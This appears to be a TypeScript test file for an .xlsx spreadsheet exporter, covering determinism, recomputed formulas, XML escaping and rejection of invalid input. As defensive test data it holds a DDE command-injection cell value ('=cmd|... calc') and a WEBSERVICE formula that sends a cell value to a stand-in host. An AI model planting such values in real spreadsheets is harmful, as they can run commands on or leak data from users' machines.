// The .xlsx of a spreadsheet work (SRV-V14-SHEET-XLSX): the same document gives the
// same bytes, every formula is written with the value the server computed again,
// the workbook parts are well formed, and a body that is no spreadsheet is refused
// with a closed answer. Every value is invented.
import { describe, expect, it } from "vitest";

import { sheetDigest, type SheetDocument } from "../../domain/index.ts";
import { crc32 } from "./zip.ts";
import {
  escapeXml,
  formulaForFile,
  renderSheetXlsx,
  sheetXlsxBytes,
  XLSX_TYPE,
} from "./sheet-xlsx.ts";

const ID_1 = "00000000-0000-4000-8000-0000000000a1";
const ID_2 = "00000000-0000-4000-8000-0000000000a2";

const DOC: SheetDocument = {
  schemaVersion: 1,
  kind: "spreadsheet",
  sheets: [
    {
      id: ID_1,
      name: "Demo bilanca",
      rows: 10,
      columns: 4,
      cells: {
        ["A1"]: { value: "demo-najam" },
        ["B1"]: { value: 120.5 },
        ["A2"]: { value: "demo-struja" },
        ["B2"]: { value: 79.5 },
        ["A3"]: { value: "Ukupno" },
        ["B3"]: { value: null, formula: "=sum(b1:b2)" },
        ["C3"]: { value: null, formula: '=IF(B3>100,"vise","manje")' },
        ["D3"]: { value: null, formula: "=B1/0" },
        ["A4"]: { value: "=cmd|' /C calc'!A0" },
      },
    },
    { id: ID_2, name: "Prazno", rows: 5, columns: 3, cells: {} },
  ],
};

/** Reads the stored entries of the ZIP the export writes, checking each CRC-32. */
function unzip(bytes: Uint8Array): Map<string, string> {
  const view = new DataView(bytes.buffer, bytes.byteOffset, bytes.byteLength);
  const out = new Map<string, string>();
  let at = 0;
  while (view.getUint32(at, true) === 0x04034b50) {
    expect(view.getUint16(at + 8, true)).toBe(0); // stored, never compressed
    const size = view.getUint32(at + 18, true);
    const nameLength = view.getUint16(at + 26, true);
    const name = new TextDecoder().decode(bytes.subarray(at + 30, at + 30 + nameLength));
    const data = bytes.subarray(at + 30 + nameLength, at + 30 + nameLength + size);
    expect(crc32(data)).toBe(view.getUint32(at + 14, true));
    out.set(name, new TextDecoder().decode(data));
    at += 30 + nameLength + size;
  }
  return out;
}

/** A minimal well-formedness check: tags balance, attributes are quoted, no stray `&` or `<`. */
function expectWellFormed(xml: string): void {
  const stack: string[] = [];
  const token =
    /<\?[^>]*\?>|<!--[\s\S]*?-->|<\/([A-Za-z_][\w:.-]*)\s*>|<([A-Za-z_][\w:.-]*)((?:\s+[\w:.-]+="[^"<]*")*)\s*(\/?)>|([^<]+)/gu;
  let last = 0;
  for (const match of xml.matchAll(token)) {
    expect(match.index).toBe(last);
    last = match.index + match[0].length;
    if (match[1] !== undefined) expect(stack.pop()).toBe(match[1]);
    else if (match[2] !== undefined) {
      if (match[4] !== "/") stack.push(match[2]);
    } else if (match[5] !== undefined) {
      expect(match[5]).not.toMatch(
        /&(?!(?:amp|lt|gt|quot|apos);)|[\u0000-\u0008\u000b\u000c\u000e-\u001f]/u,
      );
    }
  }
  expect(last).toBe(xml.length);
  expect(stack).toEqual([]);
}

describe("sheetXlsxBytes", () => {
  it("is a ZIP of the OOXML parts, each well formed", () => {
    const parts = unzip(sheetXlsxBytes(DOC));
    expect([...parts.keys()]).toEqual([
      "[Content_Types].xml",
      "_rels/.rels",
      "xl/workbook.xml",
      "xl/_rels/workbook.xml.rels",
      "xl/worksheets/sheet1.xml",
      "xl/worksheets/sheet2.xml",
      "xl/styles.xml",
      "xl/sharedStrings.xml",
    ]);
    for (const xml of parts.values()) expectWellFormed(xml);
    expect(parts.get("xl/workbook.xml")).toContain(
      '<sheet name="Demo bilanca" sheetId="1" r:id="rId1"/>',
    );
    expect(parts.get("xl/workbook.xml")).toContain(
      '<sheet name="Prazno" sheetId="2" r:id="rId2"/>',
    );
    expect(parts.get("[Content_Types].xml")).toContain("/xl/worksheets/sheet2.xml");
    expect(parts.get("xl/worksheets/sheet2.xml")).toContain("<sheetData/>");
  });

  it("gives the same bytes for the same document, and other bytes for another value", () => {
    const first = sheetXlsxBytes(DOC);
    expect(Buffer.from(sheetXlsxBytes(structuredClone(DOC)))).toEqual(Buffer.from(first));
    const other = structuredClone(DOC);
    other.sheets[0]!.cells.B1 = { value: 121.5 };
    expect(Buffer.from(sheetXlsxBytes(other)).equals(Buffer.from(first))).toBe(false);
  });

  it("writes each formula with the value the server computed again, never a stored one", () => {
    const sheet = unzip(sheetXlsxBytes(DOC)).get("xl/worksheets/sheet1.xml") ?? "";
    expect(sheet).toContain('<c r="B3"><f>SUM(B1:B2)</f><v>200</v></c>');
    expect(sheet).toContain(
      '<c r="C3" t="str"><f>IF(B3&gt;100,&quot;vise&quot;,&quot;manje&quot;)</f><v>vise</v></c>',
    );
    expect(sheet).toContain('<c r="D3" t="e"><f>B1/0</f><v>#DIV/0!</v></c>');
    expect(sheet).toContain('<c r="B1"><v>120.5</v></c>');
    expect(sheet).toContain('<dimension ref="A1:D4"/>');
  });

  it("keeps text that looks like a formula as text, and escapes markup", () => {
    const parts = unzip(sheetXlsxBytes(DOC));
    const sheet = parts.get("xl/worksheets/sheet1.xml") ?? "";
    expect(sheet).toMatch(/<c r="A4" t="s"><v>\d+<\/v><\/c>/u);
    expect(sheet).not.toContain("<f>cmd");
    expect(parts.get("xl/sharedStrings.xml")).toContain("=cmd|&apos; /C calc&apos;!A0");
    expect(escapeXml("a&b<c>\"d'\u0001")).toBe("a&amp;b&lt;c&gt;&quot;d&apos;�");
  });

  it("shares a repeated text once and counts every use", () => {
    const doc = structuredClone(DOC);
    doc.sheets[0]!.cells.A5 = { value: "demo-najam" };
    const strings = unzip(sheetXlsxBytes(doc)).get("xl/sharedStrings.xml") ?? "";
    expect(strings).toContain('count="5" uniqueCount="4"');
  });

  it("writes a cell of a circular formula as #REF!, an error value a reader knows", () => {
    const doc = structuredClone(DOC);
    doc.sheets[0]!.cells.A1 = { value: null, formula: "=B1" };
    doc.sheets[0]!.cells.B1 = { value: null, formula: "=A1" };
    const sheet = unzip(sheetXlsxBytes(doc)).get("xl/worksheets/sheet1.xml") ?? "";
    expect(sheet).toContain('<c r="A1" t="e"><f>B1</f><v>#REF!</v></c>');
  });
});

describe("what a reader could run or misread", () => {
  it("never writes a formula the server does not compute, only its error value", () => {
    const doc = structuredClone(DOC);
    const cells = doc.sheets[0]!.cells;
    cells["E1"] = { value: null, formula: '=WEBSERVICE("https://example.invalid/"&A1)' };
    cells["E2"] = { value: null, formula: "=SUM(AA1:AA2)" };
    cells["E3"] = { value: null, formula: "=1+" };
    cells["E4"] = { value: null, formula: "=SUM(B1:B2)+FOO(1)" };
    const sheet = unzip(sheetXlsxBytes(doc)).get("xl/worksheets/sheet1.xml") ?? "";
    expect(sheet).not.toMatch(/WEBSERVICE|FOO|AA1/u);
    expect(sheet).toContain('<c r="E1" t="e"><v>#VALUE!</v></c>');
    expect(sheet).toContain('<c r="E2" t="e"><v>#REF!</v></c>');
    expect(sheet).toContain('<c r="E3" t="e"><v>#VALUE!</v></c>');
    expect(sheet).toContain('<c r="E4" t="e"><v>#NAME?</v></c>');
    expect(sheet).toContain("<f>SUM(B1:B2)</f>");
  });

  it("escapes a literal _xHHHH_ in text, a computed text and a sheet name", () => {
    const doc = structuredClone(DOC);
    doc.sheets[0]!.cells["E1"] = { value: "_x0041_ i _X00ff_ ali _x41_" };
    doc.sheets[0]!.cells["E2"] = { value: null, formula: '="_x0041_"' };
    doc.sheets[1]!.name = "_x0042_";
    const parts = unzip(sheetXlsxBytes(doc));
    expect(parts.get("xl/sharedStrings.xml")).toContain("_x005F_x0041_ i _x005F_X00ff_ ali _x41_");
    expect(parts.get("xl/worksheets/sheet1.xml")).toContain("<v>_x005F_x0041_</v>");
    expect(parts.get("xl/workbook.xml")).toContain('name="_x005F_x0042_"');
  });
});

describe("formulaForFile", () => {
  it("drops the equals sign and capitalises outside text literals only", () => {
    expect(formulaForFile('=if(a1="ab""c",round(b2,2),0)')).toBe('IF(A1="ab""c",ROUND(B2,2),0)');
  });
});

describe("renderSheetXlsx", () => {
  it("renders a stored spreadsheet and gives the digest of its canonical document", () => {
    const rendered = renderSheetXlsx({ body: JSON.stringify(DOC) });
    expect(rendered.status).toBe("rendered");
    if (rendered.status !== "rendered") return;
    expect(rendered.sheetSha256).toBe(sheetDigest(DOC));
    expect(XLSX_TYPE).toContain("spreadsheetml.sheet");
  });

  it("answers not_spreadsheet for a text work, and refuses the unreadable", () => {
    expect(
      renderSheetXlsx({ body: JSON.stringify({ schemaVersion: 4, sources: [], nodes: [] }) }),
    ).toEqual({
      status: "not_spreadsheet",
    });
    expect(renderSheetXlsx({ body: "[]" })).toEqual({ status: "not_spreadsheet" });
    expect(renderSheetXlsx({ body: "null" })).toEqual({ status: "not_spreadsheet" });
    expect(renderSheetXlsx({ body: "nije json" })).toEqual({
      status: "unreadable",
      reason: "body_not_json",
    });
    const broken = { ...DOC, sheets: [{ ...DOC.sheets[0], rows: 1000 }] };
    expect(renderSheetXlsx({ body: JSON.stringify(broken) })).toEqual({
      status: "unreadable",
      reason: "body_invalid",
    });
    const unknownField = { ...DOC, extra: 1 };
    expect(renderSheetXlsx({ body: JSON.stringify(unknownField) })).toEqual({
      status: "unreadable",
      reason: "body_invalid",
    });
  });
});
